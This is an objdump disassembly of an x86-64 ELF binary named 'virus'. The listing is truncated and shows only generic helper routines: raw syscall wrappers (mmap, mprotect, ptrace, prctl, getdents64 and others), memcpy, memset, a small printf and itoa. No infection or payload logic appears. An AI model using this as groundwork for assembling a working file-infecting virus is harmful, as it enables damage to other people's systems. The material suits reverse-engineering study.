
virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
00000000004021ed <_fsync>:
  4021ed:	f3 0f 1e fa          	endbr64 
  4021f1:	55                   	push   rbp
  4021f2:	48 89 e5             	mov    rbp,rsp
  4021f5:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4021f8:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4021fc:	48 c7 c0 4a 00 00 00 	mov    rax,0x4a
  402203:	0f 05                	syscall 
  402205:	48 89 c0             	mov    rax,rax
  402208:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40220c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402210:	5d                   	pop    rbp
  402211:	c3                   	ret    

0000000000402212 <_mmap>:
  402212:	f3 0f 1e fa          	endbr64 
  402216:	55                   	push   rbp
  402217:	48 89 e5             	mov    rbp,rsp
  40221a:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  40221e:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  402222:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  402226:	48 89 4d c0          	mov    QWORD PTR [rbp-0x40],rcx
  40222a:	4c 89 45 b8          	mov    QWORD PTR [rbp-0x48],r8
  40222e:	4c 89 4d b0          	mov    QWORD PTR [rbp-0x50],r9
  402232:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  402236:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40223a:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  40223e:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  402242:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  402246:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40224a:	48 8b 7d d8          	mov    rdi,QWORD PTR [rbp-0x28]
  40224e:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  402252:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  402256:	4c 8b 55 c0          	mov    r10,QWORD PTR [rbp-0x40]
  40225a:	4c 8b 45 f8          	mov    r8,QWORD PTR [rbp-0x8]
  40225e:	4c 8b 4d f0          	mov    r9,QWORD PTR [rbp-0x10]
  402262:	48 c7 c0 09 00 00 00 	mov    rax,0x9
  402269:	0f 05                	syscall 
  40226b:	48 89 c0             	mov    rax,rax
  40226e:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  402272:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402276:	5d                   	pop    rbp
  402277:	c3                   	ret    

0000000000402278 <_munmap>:
  402278:	f3 0f 1e fa          	endbr64 
  40227c:	55                   	push   rbp
  40227d:	48 89 e5             	mov    rbp,rsp
  402280:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402284:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402288:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40228c:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402290:	48 c7 c0 0b 00 00 00 	mov    rax,0xb
  402297:	0f 05                	syscall 
  402299:	48 89 c0             	mov    rax,rax
  40229c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022a0:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022a4:	5d                   	pop    rbp
  4022a5:	c3                   	ret    

00000000004022a6 <_mprotect>:
  4022a6:	f3 0f 1e fa          	endbr64 
  4022aa:	55                   	push   rbp
  4022ab:	48 89 e5             	mov    rbp,rsp
  4022ae:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022b2:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4022b6:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  4022b9:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4022bd:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4022c1:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  4022c5:	48 c7 c0 0a 00 00 00 	mov    rax,0xa
  4022cc:	0f 05                	syscall 
  4022ce:	48 89 c0             	mov    rax,rax
  4022d1:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022d5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022d9:	5d                   	pop    rbp
  4022da:	c3                   	ret    

00000000004022db <_ptrace>:
  4022db:	f3 0f 1e fa          	endbr64 
  4022df:	55                   	push   rbp
  4022e0:	48 89 e5             	mov    rbp,rsp
  4022e3:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022e7:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4022eb:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4022ef:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  4022f3:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4022f7:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4022fb:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4022ff:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  402303:	48 c7 c0 65 00 00 00 	mov    rax,0x65
  40230a:	0f 05                	syscall 
  40230c:	48 89 c0             	mov    rax,rax
  40230f:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402313:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402317:	5d                   	pop    rbp
  402318:	c3                   	ret    

0000000000402319 <_prctl>:
  402319:	f3 0f 1e fa          	endbr64 
  40231d:	55                   	push   rbp
  40231e:	48 89 e5             	mov    rbp,rsp
  402321:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402325:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402329:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40232d:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  402331:	4c 89 45 c8          	mov    QWORD PTR [rbp-0x38],r8
  402335:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402339:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40233d:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402341:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  402345:	48 c7 c0 9d 00 00 00 	mov    rax,0x9d
  40234c:	0f 05                	syscall 
  40234e:	48 89 c0             	mov    rax,rax
  402351:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402355:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402359:	5d                   	pop    rbp
  40235a:	c3                   	ret    

000000000040235b <_getdents64>:
  40235b:	f3 0f 1e fa          	endbr64 
  40235f:	55                   	push   rbp
  402360:	48 89 e5             	mov    rbp,rsp
  402363:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402366:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40236a:	89 55 e8             	mov    DWORD PTR [rbp-0x18],edx
  40236d:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  402371:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402375:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402379:	48 c7 c0 d9 00 00 00 	mov    rax,0xd9
  402380:	0f 05                	syscall 
  402382:	48 89 c0             	mov    rax,rax
  402385:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402389:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40238d:	5d                   	pop    rbp
  40238e:	c3                   	ret    

000000000040238f <_gettimeofday>:
  40238f:	f3 0f 1e fa          	endbr64 
  402393:	55                   	push   rbp
  402394:	48 89 e5             	mov    rbp,rsp
  402397:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40239b:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40239f:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4023a3:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023a7:	48 c7 c0 60 00 00 00 	mov    rax,0x60
  4023ae:	0f 05                	syscall 
  4023b0:	48 89 c0             	mov    rax,rax
  4023b3:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4023b7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023bb:	5d                   	pop    rbp
  4023bc:	c3                   	ret    

00000000004023bd <_memcpy>:
  4023bd:	f3 0f 1e fa          	endbr64 
  4023c1:	55                   	push   rbp
  4023c2:	48 89 e5             	mov    rbp,rsp
  4023c5:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  4023c9:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  4023cd:	89 55 cc             	mov    DWORD PTR [rbp-0x34],edx
  4023d0:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4023d4:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  4023d8:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4023dc:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4023e0:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4023e7:	eb 1b                	jmp    402404 <_memcpy+0x47>
  4023e9:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4023ed:	0f b6 10             	movzx  edx,BYTE PTR [rax]
  4023f0:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4023f4:	88 10                	mov    BYTE PTR [rax],dl
  4023f6:	48 83 45 f0 01       	add    QWORD PTR [rbp-0x10],0x1
  4023fb:	48 83 45 e8 01       	add    QWORD PTR [rbp-0x18],0x1
  402400:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  402404:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402407:	39 45 cc             	cmp    DWORD PTR [rbp-0x34],eax
  40240a:	77 dd                	ja     4023e9 <_memcpy+0x2c>
  40240c:	90                   	nop
  40240d:	90                   	nop
  40240e:	5d                   	pop    rbp
  40240f:	c3                   	ret    

0000000000402410 <Memset>:
  402410:	f3 0f 1e fa          	endbr64 
  402414:	55                   	push   rbp
  402415:	48 89 e5             	mov    rbp,rsp
  402418:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40241c:	89 f0                	mov    eax,esi
  40241e:	89 55 e0             	mov    DWORD PTR [rbp-0x20],edx
  402421:	88 45 e4             	mov    BYTE PTR [rbp-0x1c],al
  402424:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  402428:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40242c:	8b 45 e0             	mov    eax,DWORD PTR [rbp-0x20]
  40242f:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
  402432:	eb 0f                	jmp    402443 <Memset+0x33>
  402434:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402438:	0f b6 55 e4          	movzx  edx,BYTE PTR [rbp-0x1c]
  40243c:	88 10                	mov    BYTE PTR [rax],dl
  40243e:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  402443:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  402446:	8d 50 ff             	lea    edx,[rax-0x1]
  402449:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  40244c:	85 c0                	test   eax,eax
  40244e:	75 e4                	jne    402434 <Memset+0x24>
  402450:	90                   	nop
  402451:	90                   	nop
  402452:	5d                   	pop    rbp
  402453:	c3                   	ret    

0000000000402454 <_printf>:
  402454:	f3 0f 1e fa          	endbr64 
  402458:	55                   	push   rbp
  402459:	48 89 e5             	mov    rbp,rsp
  40245c:	48 81 ec 10 01 00 00 	sub    rsp,0x110
  402463:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  40246a:	48 89 b5 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],rsi
  402471:	48 89 95 60 ff ff ff 	mov    QWORD PTR [rbp-0xa0],rdx
  402478:	48 89 8d 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],rcx
  40247f:	4c 89 85 70 ff ff ff 	mov    QWORD PTR [rbp-0x90],r8
  402486:	4c 89 8d 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],r9
  40248d:	84 c0                	test   al,al
  40248f:	74 20                	je     4024b1 <_printf+0x5d>
  402491:	0f 29 45 80          	movaps XMMWORD PTR [rbp-0x80],xmm0
  402495:	0f 29 4d 90          	movaps XMMWORD PTR [rbp-0x70],xmm1
  402499:	0f 29 55 a0          	movaps XMMWORD PTR [rbp-0x60],xmm2
  40249d:	0f 29 5d b0          	movaps XMMWORD PTR [rbp-0x50],xmm3
  4024a1:	0f 29 65 c0          	movaps XMMWORD PTR [rbp-0x40],xmm4
  4024a5:	0f 29 6d d0          	movaps XMMWORD PTR [rbp-0x30],xmm5
  4024a9:	0f 29 75 e0          	movaps XMMWORD PTR [rbp-0x20],xmm6
  4024ad:	0f 29 7d f0          	movaps XMMWORD PTR [rbp-0x10],xmm7
  4024b1:	48 c7 85 20 ff ff ff 	mov    QWORD PTR [rbp-0xe0],0x0
  4024b8:	00 00 00 00 
  4024bc:	48 c7 85 28 ff ff ff 	mov    QWORD PTR [rbp-0xd8],0x0
  4024c3:	00 00 00 00 
  4024c7:	48 c7 85 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],0x0
  4024ce:	00 00 00 00 
  4024d2:	66 c7 85 38 ff ff ff 	mov    WORD PTR [rbp-0xc8],0x0
  4024d9:	00 00 
  4024db:	c7 85 08 ff ff ff 08 	mov    DWORD PTR [rbp-0xf8],0x8
  4024e2:	00 00 00 
  4024e5:	c7 85 0c ff ff ff 30 	mov    DWORD PTR [rbp-0xf4],0x30
  4024ec:	00 00 00 
  4024ef:	48 8d 45 10          	lea    rax,[rbp+0x10]
  4024f3:	48 89 85 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rax
  4024fa:	48 8d 85 50 ff ff ff 	lea    rax,[rbp-0xb0]
  402501:	48 89 85 18 ff ff ff 	mov    QWORD PTR [rbp-0xe8],rax
  402508:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40250f:	00 00 00 
  402512:	e9 6d 02 00 00       	jmp    402784 <_printf+0x330>
  402517:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40251e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402521:	3c 25                	cmp    al,0x25
  402523:	74 31                	je     402556 <_printf+0x102>
  402525:	83 bd 4c ff ff ff 00 	cmp    DWORD PTR [rbp-0xb4],0x0
  40252c:	75 28                	jne    402556 <_printf+0x102>
  40252e:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402535:	ba 01 00 00 00       	mov    edx,0x1
  40253a:	48 89 c6             	mov    rsi,rax
  40253d:	bf 01 00 00 00       	mov    edi,0x1
  402542:	e8 b9 fb ff ff       	call   402100 <_write>
  402547:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40254e:	00 00 00 
  402551:	e9 26 02 00 00       	jmp    40277c <_printf+0x328>
  402556:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40255d:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402560:	3c 25                	cmp    al,0x25
  402562:	0f 84 0a 02 00 00    	je     402772 <_printf+0x31e>
  402568:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40256f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  402572:	0f be c0             	movsx  eax,al
  402575:	83 f8 78             	cmp    eax,0x78
  402578:	0f 84 61 01 00 00    	je     4026df <_printf+0x28b>
  40257e:	83 f8 78             	cmp    eax,0x78
  402581:	0f 8f c5 01 00 00    	jg     40274c <_printf+0x2f8>
  402587:	83 f8 75             	cmp    eax,0x75
  40258a:	74 79                	je     402605 <_printf+0x1b1>
  40258c:	83 f8 75             	cmp    eax,0x75
  40258f:	0f 8f b7 01 00 00    	jg     40274c <_printf+0x2f8>
  402595:	83 f8 64             	cmp    eax,0x64
  402598:	0f 84 d4 00 00 00    	je     402672 <_printf+0x21e>
  40259e:	83 f8 73             	cmp    eax,0x73
  4025a1:	0f 85 a5 01 00 00    	jne    40274c <_printf+0x2f8>
  4025a7:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4025ad:	83 f8 2f             	cmp    eax,0x2f
  4025b0:	77 23                	ja     4025d5 <_printf+0x181>
  4025b2:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  4025b9:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4025bf:	89 d2                	mov    edx,edx
  4025c1:	48 01 d0             	add    rax,rdx
  4025c4:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4025ca:	83 c2 08             	add    edx,0x8
  4025cd:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  4025d3:	eb 12                	jmp    4025e7 <_printf+0x193>
  4025d5:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4025dc:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4025e0:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4025e7:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4025ea:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  4025f1:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4025f8:	48 89 c7             	mov    rdi,rax
  4025fb:	e8 cd 04 00 00       	call   402acd <_puts>
  402600:	e9 61 01 00 00       	jmp    402766 <_printf+0x312>
  402605:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  40260b:	83 f8 2f             	cmp    eax,0x2f
  40260e:	77 23                	ja     402633 <_printf+0x1df>
  402610:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402617:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40261d:	89 d2                	mov    edx,edx
  40261f:	48 01 d0             	add    rax,rdx
  402622:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402628:	83 c2 08             	add    edx,0x8
  40262b:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  402631:	eb 12                	jmp    402645 <_printf+0x1f1>
  402633:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  40263a:	48 8d 50 08          	lea    rdx,[rax+0x8]
  40263e:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  402645:	8b 00                	mov    eax,DWORD PTR [rax]
  402647:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  40264d:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  402653:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  40265a:	48 89 d6             	mov    rsi,rdx
  40265d:	48 89 c7             	mov    rdi,rax
  402660:	e8 38 01 00 00       	call   40279d <itoa>
  402665:	48 89 c7             	mov    rdi,rax
  402668:	e8 60 04 00 00       	call   402acd <_puts>
  40266d:	e9 f4 00 00 00       	jmp    402766 <_printf+0x312>
  402672:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  402678:	83 f8 2f             	cmp    eax,0x2f
  40267b:	77 23                	ja     4026a0 <_printf+0x24c>
  40267d:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  402684:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  40268a:	89 d2                	mov    edx,edx
  40268c:	48 01 d0             	add    rax,rdx
  40268f:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402695:	83 c2 08             	add    edx,0x8
  402698:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40269e:	eb 12                	jmp    4026b2 <_printf+0x25e>
  4026a0:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  4026a7:	48 8d 50 08          	lea    rdx,[rax+0x8]
  4026ab:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  4026b2:	8b 00                	mov    eax,DWORD PTR [rax]
  4026b4:	89 85 3c ff ff ff    	mov    DWORD PTR [rbp-0xc4],eax
  4026ba:	8b 85 3c ff ff ff    	mov    eax,DWORD PTR [rbp-0xc4]
  4026c0:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  4026c7:	48 89 d6             	mov    rsi,rdx
  4026ca:	48 89 c7             	mov    rdi,rax
  4026cd:	e8 cb 00 00 00       	call   40279d <itoa>
  4026d2:	48 89 c7             	mov    rdi,rax
  4026d5:	e8 f3 03 00 00       	call   402acd <_puts>
  4026da:	e9 87 00 00 00       	jmp    402766 <_printf+0x312>
  4026df:	8b 85 08 ff ff ff    	mov    eax,DWORD PTR [rbp-0xf8]
  4026e5:	83 f8 2f             	cmp    eax,0x2f
  4026e8:	77 23                	ja     40270d <_printf+0x2b9>
  4026ea:	48 8b 85 18 ff ff ff 	mov    rax,QWORD PTR [rbp-0xe8]
  4026f1:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  4026f7:	89 d2                	mov    edx,edx
  4026f9:	48 01 d0             	add    rax,rdx
  4026fc:	8b 95 08 ff ff ff    	mov    edx,DWORD PTR [rbp-0xf8]
  402702:	83 c2 08             	add    edx,0x8
  402705:	89 95 08 ff ff ff    	mov    DWORD PTR [rbp-0xf8],edx
  40270b:	eb 12                	jmp    40271f <_printf+0x2cb>
  40270d:	48 8b 85 10 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf0]
  402714:	48 8d 50 08          	lea    rdx,[rax+0x8]
  402718:	48 89 95 10 ff ff ff 	mov    QWORD PTR [rbp-0xf0],rdx
  40271f:	48 8b 00             	mov    rax,QWORD PTR [rax]
  402722:	48 89 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rax
  402729:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  402730:	48 8d 95 20 ff ff ff 	lea    rdx,[rbp-0xe0]
  402737:	48 89 d6             	mov    rsi,rdx
  40273a:	48 89 c7             	mov    rdi,rax
  40273d:	e8 dd 01 00 00       	call   40291f <itox>
  402742:	48 89 c7             	mov    rdi,rax
  402745:	e8 83 03 00 00       	call   402acd <_puts>
  40274a:	eb 1a                	jmp    402766 <_printf+0x312>
  40274c:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  402753:	ba 01 00 00 00       	mov    edx,0x1
  402758:	48 89 c6             	mov    rsi,rax
  40275b:	bf 01 00 00 00       	mov    edi,0x1
  402760:	e8 9b f9 ff ff       	call   402100 <_write>
  402765:	90                   	nop
  402766:	c7 85 4c ff ff ff 00 	mov    DWORD PTR [rbp-0xb4],0x0
  40276d:	00 00 00 
  402770:	eb 0a                	jmp    40277c <_printf+0x328>
  402772:	c7 85 4c ff ff ff 01 	mov    DWORD PTR [rbp-0xb4],0x1
  402779:	00 00 00 
  40277c:	48 83 85 f8 fe ff ff 	add    QWORD PTR [rbp-0x108],0x1
  402783:	01 
  402784:	48 8b 85 f8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x108]
  40278b:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40278e:	84 c0                	test   al,al
  402790:	0f 85 81 fd ff ff    	jne    402517 <_printf+0xc3>
  402796:	b8 01 00 00 00       	mov    eax,0x1
  40279b:	c9                   	leave  
  40279c:	c3                   	ret    

000000000040279d <itoa>:
  40279d:	f3 0f 1e fa          	endbr64 
  4027a1:	55                   	push   rbp
  4027a2:	48 89 e5             	mov    rbp,rsp
  4027a5:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4027a9:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4027ad:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4027b4:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  4027b8:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  4027bf:	66 66 66 
  4027c2:	48 89 c8             	mov    rax,rcx
  4027c5:	48 f7 ea             	imul   rdx
  4027c8:	48 c1 fa 02          	sar    rdx,0x2
  4027cc:	48 89 c8             	mov    rax,rcx
  4027cf:	48 c1 f8 3f          	sar    rax,0x3f
  4027d3:	48 29 c2             	sub    rdx,rax
  4027d6:	48 89 d0             	mov    rax,rdx
  4027d9:	48 c1 e0 02          	shl    rax,0x2
  4027dd:	48 01 d0             	add    rax,rdx
  4027e0:	48 01 c0             	add    rax,rax
  4027e3:	48 29 c1             	sub    rcx,rax
  4027e6:	48 89 ca             	mov    rdx,rcx
  4027e9:	89 d0                	mov    eax,edx
  4027eb:	8d 48 30             	lea    ecx,[rax+0x30]
  4027ee:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4027f1:	48 63 d0             	movsxd rdx,eax
  4027f4:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4027f8:	48 01 d0             	add    rax,rdx
  4027fb:	89 ca                	mov    edx,ecx
  4027fd:	88 10                	mov    BYTE PTR [rax],dl
  4027ff:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  402803:	48 ba 67 66 66 66 66 	movabs rdx,0x6666666666666667
  40280a:	66 66 66 
  40280d:	48 89 c8             	mov    rax,rcx
  402810:	48 f7 ea             	imul   rdx
  402813:	48 c1 fa 02          	sar    rdx,0x2
  402817:	48 89 c8             	mov    rax,rcx
  40281a:	48 c1 f8 3f          	sar    rax,0x3f
  40281e:	48 29 c2             	sub    rdx,rax
  402821:	48 89 d0             	mov    rax,rdx
  402824:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402828:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40282c:	48 83 7d e8 00       	cmp    QWORD PTR [rbp-0x18],0x0
  402831:	75 81                	jne    4027b4 <itoa+0x17>
  402833:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402836:	48 63 d0             	movsxd rdx,eax
  402839:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  40283d:	48 01 d0             	add    rax,rdx
  402840:	c6 00 00             	mov    BYTE PTR [rax],0x0
  402843:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  40284a:	e9 b5 00 00 00       	jmp    402904 <itoa+0x167>
  40284f:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  402852:	48 63 d0             	movsxd rdx,eax
  402855:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402859:	48 01 d0             	add    rax,rdx
  40285c:	0f b6 30             	movzx  esi,BYTE PTR [rax]
  40285f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402862:	2b 45 f8             	sub    eax,DWORD PTR [rbp-0x8]
